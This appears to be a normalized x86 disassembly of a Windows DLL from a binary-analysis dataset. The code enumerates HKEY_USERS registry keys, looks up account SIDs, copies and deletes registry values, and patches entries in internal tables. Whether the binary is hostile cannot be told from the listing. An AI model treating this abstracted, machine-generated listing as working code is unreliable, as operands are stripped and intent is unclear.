push rw-data
push esi
call [ sscanf@IAT ]
add esp 0xc
push esi
call [ lstrlenA@IAT ]
add edi 0x4
dec [ ebp + 0x8 ]
lea esi [ esi + eax + 0x1 ]
jne r-xdata
sub_1000788e
push ebp
mov ebp esp
sub esp 0x14c
push ebx
push esi
lea eax [ ebp - 0x24 ]
push edi
xor ebx ebx
push eax
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] 0x12
mov [ ebp - 0x23 ] 0x78
mov [ ebp - 0x22 ] 0x79
mov [ ebp - 0x21 ] 0x7a
mov [ ebp - 0x20 ] 0x7d
mov [ ebp - 0x1f ] 0x69
mov [ ebp - 0x1e ] 0x70
mov [ ebp - 0x1d ] 0x68
mov [ ebp - 0x1c ] bl
call sub_100075fc
mov [ esp ] rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp - 0x34 ] edi
je r-xdata
mov [ ebp - 0x4 ] 0x4dd
call [ GetVersion@IAT ]
cmp eax 0x80000000
jae r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] ebx
mov [ rw-data ] eax
je r-xdata
push ebx
push ebx
mov edi [ RegEnumKeyExA@IAT ]
push ebx
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x14c ]
push eax
push ebx
push 0x80000003
mov [ ebp - 0x8 ] 0x104
mov [ ebp - 0x14 ] ebx
call edi
cmp eax 0x103
je r-xdata
cmp [ ebp - 0x28 ] 0x1
jne r-xdata
push edi
call [ FreeLibrary@IAT ]
mov [ ebp - 0x34 ] ebx
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x28 ] 0x1
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x14c ]
push eax
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
push ebx
call [ rw-data ]
test eax eax
je r-xdata
cmp eax ebx
je r-xdata
push [ ebp - 0x4 ]
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call [ SetLastError@IAT ]
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x34 ] ebx
je r-xdata
lea eax [ ebp - 0x14c ]
push eax
call sub_1000771c
cmp eax ebx
pop ecx
mov [ ebp - 0x18 ] eax
je r-xdata
lea eax [ ebp - 0x14c ]
push eax
call [ lstrlenA@IAT ]
cmp eax 0x14
jle r-xdata
cmp [ ebp - 0x44 ] ebx
mov [ ebp - 0x14 ] ebx
jbe r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
push [ ebp - 0x34 ]
call [ FreeLibrary@IAT ]
inc [ ebp - 0x14 ]
push ebx
push ebx
push ebx
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x14c ]
push eax
mov [ ebp - 0x14c ] bl
push [ ebp - 0x14 ]
mov [ ebp - 0x8 ] 0x104
push 0x80000003
call edi
cmp eax 0x103
je r-xdata
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0xc ] ebx
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0xc ]
push ebx
push ecx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
push eax
push ebx
call [ LookupAccountSidA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x18 ]
call [ rw-data ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x2c ] ebx
cmp [ ebp - 0x4 ] ebx
jne r-xdata
call [ GetLastError@IAT ]
push 0x7a
pop edx
cmp eax edx
jne r-xdata
cmp [ ebp - 0x4 ] 0x7a
je r-xdata
inc [ ebp - 0x14 ]
add [ ebp - 0x2c ] 0xc
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x44 ]
jb r-xdata
lea ecx [ ebp - 0x40 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push 0x5
push [ eax ]
push ebx
call [ rw-data ]
test eax eax
je r-xdata
push [ ebp - 0x18 ]
call [ FreeSid@IAT ]
mov eax [ ebp - 0xc ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
add eax ecx
cmp [ eax + 0x8 ] ebx
jne r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ LookupAccountNameA@IAT ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push ebx
push eax
push ebx
mov [ ebp - 0x30 ] ebx
push [ ebp - 0x8 ]
mov [ ebp - 0x38 ] ebx
push ebx
call edi
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
push [ ebp - 0x8 ]
call [ rw-data ]
mov [ ebp - 0x8 ] ebx
call [ GetLastError@IAT ]
push 0x7a
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx ebx
je r-xdata
push [ ebp - 0x30 ]
call sub_1000d4d0
push [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
call sub_1000d4d0
cmp [ ebp - 0xc ] ebx
pop ecx
pop ecx
mov [ ebp - 0x3c ] eax
je r-xdata
mov ecx [ ebp + 0x14 ]
cmp ecx ebx
je r-xdata
cmp [ ecx ] eax
jae r-xdata
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] edx
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ecx ] eax
jae r-xdata
mov [ ecx ] eax
mov [ ebp - 0x4 ] edx
lea ecx [ ebp - 0x48 ]
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push ebx
call edi
test eax eax
je r-xdata
push [ ebp - 0x10 ]
call sub_1000d4d0
cmp [ ebp + 0x8 ] ebx
pop ecx
mov esi eax
je r-xdata
mov [ ecx ] eax
mov [ ebp - 0x4 ] edx
push [ ebp - 0xc ]
call memset
push [ ebp - 0x3c ]
call memset
pop ecx
pop ecx
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
push eax
push ebx
push [ ebp - 0xc ]
call sub_1000760a
add esp 0xc
test eax eax
jne r-xdata
cmp esi ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push esi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x18 ]
push ebx
call [ LookupAccountSidA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx ebx
je r-xdata
push esi
call memset
pop ecx
cmp [ ebp + 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x40 ]
cmp [ ecx ] eax
jae r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x14c ]
push eax
push [ ebp + 0x10 ]
call [ lstrcpyA@IAT ]
mov eax [ ebp + 0x14 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ edi ] eax
jae r-xdata
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ lstrcpyA@IAT ]
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call sub_1000760a
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x10 ]
mov [ edi ] eax
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x40 ]
mov [ eax ] ecx
sub_10007cdb
push ebp
mov ebp esp
sub esp 0x414
mov dl [ rw-data ]
push ebx
push esi
push edi
push 0x7f
xor eax eax
pop ecx
lea edi [ ebp - 0x413 ]
mov [ ebp - 0x414 ] dl
push 0x7f
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x213 ]
mov [ ebp - 0x214 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
xor ebx ebx
push eax
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push ebx
mov edi [ RegEnumValueA@IAT ]
push eax
lea eax [ ebp - 0x414 ]
push eax
push ebx
push [ ebp + 0x8 ]
mov esi 0x200
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] ebx
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x414 ]
push [ ebp - 0x10 ]
push ebx
push eax
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x414 ]
mov [ ebp - 0x8 ] esi
push eax
mov [ ebp - 0x414 ] bl
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x214 ] bl
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov [ ebp - 0x14 ] 0x1
sub_10007dc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
xor edi edi
push eax
push 0x1
mov esi rw-data
push edi
push esi
push [ ebp + 0x8 ]
xor ebx ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
leave
retn
lea eax [ ebp + 0x8 ]
push edi
push eax
push edi
push 0x2001f
push edi
push rw-data
push edi
push esi
push [ ebp + 0xc ]
call [ RegCreateKeyExA@IAT ]
mov esi [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call esi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_10007cdb
pop ecx
mov ebx eax
pop ecx
push [ ebp + 0x8 ]
call esi
mov [ ebp + 0x8 ] edi
sub_10007e2e
push ebp
mov ebp esp
sub esp 0x20c
push ebx
push esi
push edi
xor edi edi
push 0xff
lea eax [ ebp - 0x10c ]
push edi
push eax
mov [ ebp - 0xc ] edi
call sub_1000d316
mov ebx [ lstrcpyA@IAT ]
add esp 0xc
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call ebx
mov esi [ lstrcatA@IAT ]
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
mov esi [ RegOpenKeyExA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push 0x20006
push edi
lea eax [ ebp - 0x10c ]
mov edi 0x80000003
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x20019
push 0x0
push [ ebp + 0x8 ]
push edi
call esi
mov edi [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call edi
push 0xff
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_1000d316
add esp 0xc
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call ebx
lea eax [ ebp + 0x8 ]
xor ebx ebx
push eax
push 0x20019
lea eax [ ebp - 0x20c ]
push ebx
push eax
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call edi
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_10007cdb
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_10007dc0
add esp 0x10
push [ ebp + 0x8 ]
call edi
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0xc ] 0x1
sub_10007f49
push ebp
mov ebp esp
sub esp 0x11c
push ebx
push esi
push edi
xor ebx ebx
push 0xff
lea eax [ ebp - 0x11c ]
push ebx
push eax
mov [ ebp - 0xc ] ebx
call sub_1000d316
add esp 0xc
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call esi
mov edi [ RegOpenKeyExA@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push 0x2001f
lea eax [ ebp - 0x11c ]
push ebx
push eax
push 0x80000003
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x8 ]
push eax
push 0x2001f
lea eax [ ebp - 0x11c ]
push ebx
push eax
push 0x80000003
call edi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x10 ]
mov edi [ RegQueryValueExA@IAT ]
push eax
push ebx
push ebx
push ebx
push rw-data
mov [ ebp - 0x10 ] ebx
push [ ebp - 0x8 ]
call edi
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov [ ebp - 0x8 ] ebx
push [ ebp - 0x10 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0x1c ] esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
push ebx
push ebx
push rw-data
push [ ebp - 0x8 ]
call edi
test eax eax
jne r-xdata
push esi
call [ LocalFree@IAT ]
mov eax [ esi + 0x8 ]
add esi 0x8
mov edi [ RegSetValueExA@IAT ]
add esi 0x4
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] ebx
mov eax [ esi ]
add esi 0x4
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
mov [ ebp - 0x14 ] ebx
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
jmp r-xdata
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x4
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
add esi [ ebp - 0x18 ]
mov eax [ esi ]
add esi 0x4
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
mov eax [ ebp - 0xc ]
shr eax 0x1
and eax 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
test [ ebp - 0xc ] 0x4
je r-xdata
add esi [ ebp - 0x18 ]
mov eax [ esi ]
cmp eax ebx
je r-xdata
add esi 0x4
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
jmp r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push 0x3
push ebx
push rw-data
push [ ebp - 0x8 ]
call edi
mov esi [ ebp - 0x1c ]
mov [ ebp - 0xc ] 0x1
sub_1000815d
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
push edi
xor ebx ebx
push 0xff
lea eax [ ebp - 0x108 ]
push ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000d316
add esp 0xc
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
mov edi rw-data
lea eax [ ebp - 0x108 ]
push edi
push eax
call esi
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x108 ]
push edi
push eax
call esi
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x8 ]
push eax
push 0x2001f
lea eax [ ebp - 0x108 ]
push ebx
push eax
push 0x80000003
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
push ebx
push ebx
push ebx
push ebx
push rw-data
push [ ebp - 0x8 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov [ ebp - 0x4 ] 0x1
sub_1000821e
cmp [ rw-data ] 0x1
je r-xdata
retn
push rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075ee
pop ecx
mov [ rw-data ] 0x1
sub_100082ce
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ ebp + 0xc ]
push esi
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
and [ eax ] 0x0
cmp esi 0xa
jae r-xdata
push 0x57
jmp r-xdata
push ebx
push edi
push 0x14
lea eax [ ebp - 0x14 ]
pop edi
push edi
push 0x0
push eax
call sub_1000d316
add esp 0xc
mov [ ebp - 0x14 ] esi
call [ GetVersion@IAT ]
mov ebx eax
mov [ ebp + 0x8 ] 0xffffffbe
movzx eax bl
sub eax 0x4
je r-xdata
push 0xffffffe6
pop eax
jmp r-xdata
call sub_1000c680
test al al
je r-xdata
dec eax
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x14 ]
push edi
push eax
push sub_1000840e
mov [ ebp + 0x8 ] 0xffffffe2
jmp r-xdata
mov esi 0x9c
lea eax [ ebp - 0xb0 ]
push esi
push 0x0
push eax
call sub_1000d316
add esp 0xc
lea eax [ ebp - 0xb0 ]
mov [ ebp - 0xb0 ] esi
push eax
call [ GetVersionExA@IAT ]
xor eax eax
mov al bh
movzx eax al
sub eax 0x0
je r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop ebx
push edi
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push sub_100084f5
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push sub_100089de
jmp r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push esi
call memcpy
mov eax [ ebp + 0xc ]
add esp 0xc
mov [ eax ] esi
call sub_100096ce
add esp 0xc
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] 0x2
lea eax [ ebp - 0x14 ]
push edi
push eax
jae r-xdata
dec eax
jne r-xdata
push sub_10008732
jmp r-xdata
push sub_100085dc
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x14 ]
push edi
push eax
je r-xdata
push sub_10008888
jmp r-xdata
sub_1000840e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor edi edi
cmp esi edi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] edi
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
jne r-xdata
mov ecx [ eax + 0x108 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] edi
mov edx 0x220
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffec
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ecx + 0x48 ]
mov eax [ eax + edi * 8 ]
mov [ ebp - 0x2c ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp edi 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edi
mov [ ebp - 0x28 ] edi
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx edx
jne r-xdata
cmp edi [ ecx + 0x30 ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] edx
and [ ebp - 0x20 ] 0x0
sub_100084f5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor edi edi
cmp esi edi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] edi
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
jne r-xdata
mov ecx [ eax + 0x12c ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] edi
mov edx 0x220
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffec
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ecx + 0x58 ]
mov eax [ eax + edi * 8 ]
mov [ ebp - 0x2c ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp edi 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edi
mov [ ebp - 0x28 ] edi
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx edx
jne r-xdata
cmp edi [ ecx + 0x3c ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] edx
and [ ebp - 0x20 ] 0x0
sub_100085dc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
pop eax
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x3c ] edi
xor edx edx
mov [ ebp - 0x34 ] edx
mov ecx 0x220
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_100086f3
jmp r-xdata
mov eax [ edi + 0x5c ]
mov eax [ eax + edx * 8 ]
mov [ ebp - 0x38 ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edx
mov [ ebp - 0x34 ] edx
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx ecx
jne r-xdata
cmp edx [ edi + 0x40 ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] ecx
and [ ebp - 0x20 ] 0x0
sub_10008732
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
pop eax
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x3c ] edi
xor edx edx
mov [ ebp - 0x34 ] edx
mov ecx 0x220
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_10008849
jmp r-xdata
mov eax [ edi + 0x68 ]
mov eax [ eax + edx * 8 ]
mov [ ebp - 0x38 ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edx
mov [ ebp - 0x34 ] edx
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx ecx
jne r-xdata
cmp edx [ edi + 0x4c ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] ecx
and [ ebp - 0x20 ] 0x0
sub_10008888
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
pop eax
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
